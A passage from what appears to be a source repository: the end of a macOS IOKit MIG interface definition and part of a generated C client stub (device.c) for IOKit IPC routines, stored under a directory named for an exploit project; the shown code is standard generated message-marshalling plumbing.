        );

routine io_service_open_extended(
	    service		: io_object_t;
	in  owningTask		: task_t;
	in  connect_type	: uint32_t;
	in  ndr			: NDR_record_t;
	in  properties		: io_buf_ptr_t, physicalcopy;
        out result		: kern_return_t;
	out connection		: io_connect_t
	);


/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

routine io_connect_map_memory_into_task(
	    connection		: io_connect_t;
	in  memory_type		: uint32_t;
	in  into_task		: task_t;
	inout address		: mach_vm_address_t;
	inout size		: mach_vm_size_t;
	in  flags		: uint32_t
	);

routine io_connect_unmap_memory_from_task(
	    connection		: io_connect_t;
	in  memory_type		: uint32_t;
	in  from_task		: task_t;
	in  address		: mach_vm_address_t
	);

routine io_connect_method(
	    connection		: io_connect_t;
	in  selector		: uint32_t;

	in  scalar_input	: io_scalar_inband64_t;
	in  inband_input	: io_struct_inband_t;
	in  ool_input		: mach_vm_address_t;
	in  ool_input_size	: mach_vm_size_t;

	out inband_output	: io_struct_inband_t, CountInOut;
	out scalar_output	: io_scalar_inband64_t, CountInOut;
	in  ool_output		: mach_vm_address_t;
	inout ool_output_size	: mach_vm_size_t
	);

routine io_connect_async_method(
	    connection		: io_connect_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref64_t;
	in  selector		: uint32_t;

	in  scalar_input	: io_scalar_inband64_t;
	in  inband_input	: io_struct_inband_t;
	in  ool_input		: mach_vm_address_t;
	in  ool_input_size	: mach_vm_size_t;

	out inband_output	: io_struct_inband_t, CountInOut;
	out scalar_output	: io_scalar_inband64_t, CountInOut;
	in  ool_output		: mach_vm_address_t;
	inout  ool_output_size	: mach_vm_size_t
	);


#if IOKIT_ALL_IPC || __LP64__

#if IOKIT_ALL_IPC
#define FUNC_NAME(name) name ## _64
#else
#define FUNC_NAME(name) name
#endif

routine FUNC_NAME(io_connect_set_notification_port)(
	    connection		: io_connect_t;
	in  notification_type	: uint32_t;
	in  port		: mach_port_make_send_t;
	in  reference		: io_user_reference_t
	);

routine FUNC_NAME(io_service_add_notification)(
	    master_port		: mach_port_t;
	in  notification_type	: io_name_t;
	in  matching		: io_string_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref64_t;
	out notification	: io_object_t
	);

routine FUNC_NAME(io_service_add_interest_notification)(
	    service		: io_object_t;
	in  type_of_interest	: io_name_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref64_t;
	out notification	: io_object_t
	);

routine FUNC_NAME(io_service_add_notification_ool)(
	    master_port		: mach_port_t;
	in  notification_type	: io_name_t;
	in  matching		: io_buf_ptr_t, physicalcopy;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref64_t;
        out result		: kern_return_t;
	out notification	: io_object_t
	);

#else

    skip;
    skip;
    skip;
    skip;

#endif /* IOKIT_ALL_IPC || __LP64__ */

routine io_registry_entry_get_registry_entry_id(
	    registry_entry	: io_object_t;
	out entry_id		: uint64_t
	);

routine io_connect_method_var_output(
	    connection		: io_connect_t;
	in  selector		: uint32_t;

	in  scalar_input	: io_scalar_inband64_t;
	in  inband_input	: io_struct_inband_t;
	in  ool_input		: mach_vm_address_t;
	in  ool_input_size	: mach_vm_size_t;

	out inband_output	: io_struct_inband_t, CountInOut;
	out scalar_output	: io_scalar_inband64_t, CountInOut;
	out var_output		: io_buf_ptr_t, physicalcopy
	);

routine io_service_get_matching_service(
	    master_port		: mach_port_t;
	in  matching		: io_string_t;
	out service		: io_object_t
	);

routine io_service_get_matching_service_ool(
	    master_port		: mach_port_t;
	in  matching		: io_buf_ptr_t, physicalcopy;
        out result		: kern_return_t;
	out service		: io_object_t
	);

routine io_service_get_authorization_id(
	    service		: io_object_t;
	out authorization_id	: uint64_t
	);

routine io_service_set_authorization_id(
	    service		: io_object_t;
	in  authorization_id	: uint64_t
	);

/* */

routine io_server_version(
	    master_port		: mach_port_t;
	out version		: uint64_t
	);

routine io_registry_entry_get_properties_bin(
	    registry_entry	: io_object_t;
	out properties		: io_buf_ptr_t, physicalcopy
	);

routine io_registry_entry_get_property_bin(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	in  property_name	: io_name_t;
	in  options		: uint32_t;
	out properties		: io_buf_ptr_t, physicalcopy
	);

routine io_service_get_matching_service_bin(
	    master_port		: mach_port_t;
	in  matching		: io_struct_inband_t;
	out service		: io_object_t
	);

routine io_service_get_matching_services_bin(
	    master_port		: mach_port_t;
	in  matching		: io_struct_inband_t;
	out existing		: io_object_t
	);

routine io_service_match_property_table_bin(
	    service		: io_object_t;
	in  matching		: io_struct_inband_t;
	out matches		: boolean_t
	);

#if IOKIT_ALL_IPC || __ILP32__
routine io_service_add_notification_bin(
	    master_port		: mach_port_t;
	in  notification_type	: io_name_t;
	in  matching		: io_struct_inband_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref_t;
	out notification	: io_object_t
	);
#else
skip;
#endif

#if IOKIT_ALL_IPC || __LP64__
routine FUNC_NAME(io_service_add_notification_bin)(
	    master_port		: mach_port_t;
	in  notification_type	: io_name_t;
	in  matching		: io_struct_inband_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref64_t;
	out notification	: io_object_t
	);
#else
skip;
#endif

#if !IOKITSIMD

routine io_registry_entry_get_path_ool(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	out path		: io_string_inband_t;
	out path_ool		: io_buf_ptr_t, physicalcopy
	);

routine io_registry_entry_from_path_ool(
	    master_port		: mach_port_t;
	in  path                : io_string_inband_t;
	in  path_ool		: io_buf_ptr_t, physicalcopy;
        out result		: kern_return_t;
	out registry_entry	: io_object_t
	);

#endif

routine io_device_tree_entry_exists_with_name(
	    master_port		: mach_port_t;
	in  name		: io_name_t;
	out exists		: boolean_t
	);

routine io_registry_entry_get_properties_bin_buf(
	    registry_entry	: io_object_t;
	in  buf			: mach_vm_address_t;
	inout  bufsize		: mach_vm_size_t;
	out properties		: io_buf_ptr_t, physicalcopy
	);

routine io_registry_entry_get_property_bin_buf(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	in  property_name	: io_name_t;
	in  options		: uint32_t;
	in  buf			: mach_vm_address_t;
	inout  bufsize		: mach_vm_size_t;
	out properties		: io_buf_ptr_t, physicalcopy
	);

#endif /* IOKIT */

/* vim: set ft=c : */

```

`Exploits/oobPCI/Sources/generated/device.c`:

```c
/*
 * IDENTIFICATION:
 * stub generated by bootstrap_cmds-128
 * OPTIONS: 
 */
#define	__MIG_check__Reply__iokit_subsystem__ 1

#include "device.h"

/* TODO: #include <mach/mach.h> */
#ifdef __cplusplus
extern "C" {
#endif /* __cplusplus */
extern void mach_msg_destroy(mach_msg_header_t *);
#ifdef __cplusplus
}
#endif /* __cplusplus */

#ifndef	mig_internal
#define	mig_internal	static __inline__
#endif	/* mig_internal */

#ifndef	mig_external
#define mig_external
#endif	/* mig_external */

#if	!defined(__MigTypeCheck) && defined(TypeCheck)
#define	__MigTypeCheck		TypeCheck	/* Legacy setting */
#endif	/* !defined(__MigTypeCheck) */

#if	!defined(__MigKernelSpecificCode) && defined(_MIG_KERNEL_SPECIFIC_CODE_)
#define	__MigKernelSpecificCode	_MIG_KERNEL_SPECIFIC_CODE_	/* Legacy setting */
#endif	/* !defined(__MigKernelSpecificCode) */

#ifndef	LimitCheck
#define	LimitCheck 0
#endif	/* LimitCheck */

#ifndef	min
#define	min(a,b)  ( ((a) < (b))? (a): (b) )
#endif	/* min */

#if !defined(_WALIGN_)
#define _WALIGN_(x) (((x) + 3) & ~3)
#endif /* !defined(_WALIGN_) */

#if !defined(_WALIGNSZ_)
#define _WALIGNSZ_(x) _WALIGN_(sizeof(x))
#endif /* !defined(_WALIGNSZ_) */

#ifndef	UseStaticTemplates
#define	UseStaticTemplates	0
#endif	/* UseStaticTemplates */

#ifndef MIG_SERVER_ROUTINE
#define MIG_SERVER_ROUTINE
#endif

#ifndef	__MachMsgErrorWithTimeout
#define	__MachMsgErrorWithTimeout(_R_) { \
	switch (_R_) { \
	case MACH_SEND_INVALID_DATA: \
	case MACH_SEND_INVALID_DEST: \
	case MACH_SEND_INVALID_HEADER: \
		mig_put_reply_port(InP->Head.msgh_reply_port); \
		break; \
	case MACH_SEND_TIMED_OUT: \
	case MACH_RCV_TIMED_OUT: \
	default: \
		mig_dealloc_reply_port(InP->Head.msgh_reply_port); \
	} \
}
#endif	/* __MachMsgErrorWithTimeout */

#ifndef	__MachMsgErrorWithoutTimeout
#define	__MachMsgErrorWithoutTimeout(_R_) { \
	switch (_R_) { \
	case MACH_SEND_INVALID_DATA: \
	case MACH_SEND_INVALID_DEST: \
	case MACH_SEND_INVALID_HEADER: \
		mig_put_reply_port(InP->Head.msgh_reply_port); \
		break; \
	default: \
		mig_dealloc_reply_port(InP->Head.msgh_reply_port); \
	} \
}
#endif	/* __MachMsgErrorWithoutTimeout */

#ifndef	__DeclareSendRpc
#define	__DeclareSendRpc(_NUM_, _NAME_)
#endif	/* __DeclareSendRpc */

#ifndef	__BeforeSendRpc
#define	__BeforeSendRpc(_NUM_, _NAME_)
#endif	/* __BeforeSendRpc */

#ifndef	__AfterSendRpc
#define	__AfterSendRpc(_NUM_, _NAME_)
#endif	/* __AfterSendRpc */

#ifndef	__DeclareSendSimple
#define	__DeclareSendSimple(_NUM_, _NAME_)
#endif	/* __DeclareSendSimple */

#ifndef	__BeforeSendSimple
#define	__BeforeSendSimple(_NUM_, _NAME_)
#endif	/* __BeforeSendSimple */

#ifndef	__AfterSendSimple
#define	__AfterSendSimple(_NUM_, _NAME_)
#endif	/* __AfterSendSimple */

#define msgh_request_port	msgh_remote_port
#define msgh_reply_port		msgh_local_port



#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_object_get_class_t__defined)
#define __MIG_check__Reply__io_object_get_class_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_object_get_class_t(__Reply__io_object_get_class_t *Out0P)
{

	typedef __Reply__io_object_get_class_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 2900) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 128)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->classNameCnt > 128 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 128))< Out0P->classNameCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 128) + _WALIGN_(Out0P->classNameCnt)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_object_get_class_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_object_get_class */
mig_external kern_return_t io_object_get_class
(
	mach_port_t object,
	io_name_t className
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t classNameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t classNameCnt;
		char className[128];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t classNameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t classNameCnt;
		char className[128];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_object_get_class_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_object_get_class_t__defined */

	__DeclareSendRpc(2800, "io_object_get_class")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = object;
	InP->Head.msgh_id = 2800;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2800, "io_object_get_class")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2800, "io_object_get_class")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_object_get_class_t__defined)
	check_result = __MIG_check__Reply__io_object_get_class_t((__Reply__io_object_get_class_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_object_get_class_t__defined) */

	(void) mig_strncpy(className, Out0P->className, 128);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_object_conforms_to_t__defined)
#define __MIG_check__Reply__io_object_conforms_to_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_object_conforms_to_t(__Reply__io_object_conforms_to_t *Out0P)
{

	typedef __Reply__io_object_conforms_to_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2901) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_object_conforms_to_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_object_conforms_to */
mig_external kern_return_t io_object_conforms_to
(
	mach_port_t object,
	io_name_t className,
	boolean_t *conforms
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t classNameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t classNameCnt;
		char className[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t conforms;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t conforms;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_object_conforms_to_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_object_conforms_to_t__defined */

	__DeclareSendRpc(2801, "io_object_conforms_to")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->classNameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->className, className, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->classNameCnt = (mach_msg_type_number_t) mig_strncpy(InP->className, className, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->classNameOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->classNameCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = object;
	InP->Head.msgh_id = 2801;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2801, "io_object_conforms_to")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2801, "io_object_conforms_to")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_object_conforms_to_t__defined)
	check_result = __MIG_check__Reply__io_object_conforms_to_t((__Reply__io_object_conforms_to_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_object_conforms_to_t__defined) */

	*conforms = Out0P->conforms;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_iterator_next_t__defined)
#define __MIG_check__Reply__io_iterator_next_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_iterator_next_t(__Reply__io_iterator_next_t *Out0P)
{

	typedef __Reply__io_iterator_next_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2902) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->object.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->object.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_iterator_next_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_iterator_next */
mig_external kern_return_t io_iterator_next
(
	mach_port_t iterator,
	mach_port_t *object
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t object;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t object;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_iterator_next_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_iterator_next_t__defined */

	__DeclareSendRpc(2802, "io_iterator_next")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = iterator;
	InP->Head.msgh_id = 2802;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2802, "io_iterator_next")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2802, "io_iterator_next")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_iterator_next_t__defined)
	check_result = __MIG_check__Reply__io_iterator_next_t((__Reply__io_iterator_next_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_iterator_next_t__defined) */

	*object = Out0P->object.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_iterator_reset_t__defined)
#define __MIG_check__Reply__io_iterator_reset_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_iterator_reset_t(__Reply__io_iterator_reset_t *Out0P)
{

	typedef __Reply__io_iterator_reset_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2903) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_iterator_reset_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_iterator_reset */
mig_external kern_return_t io_iterator_reset
(
	mach_port_t iterator
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_iterator_reset_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_iterator_reset_t__defined */

	__DeclareSendRpc(2803, "io_iterator_reset")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = iterator;
	InP->Head.msgh_id = 2803;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2803, "io_iterator_reset")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2803, "io_iterator_reset")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_iterator_reset_t__defined)
	check_result = __MIG_check__Reply__io_iterator_reset_t((__Reply__io_iterator_reset_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_iterator_reset_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_get_matching_services_t__defined)
#define __MIG_check__Reply__io_service_get_matching_services_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_get_matching_services_t(__Reply__io_service_get_matching_services_t *Out0P)
{

	typedef __Reply__io_service_get_matching_services_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2904) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
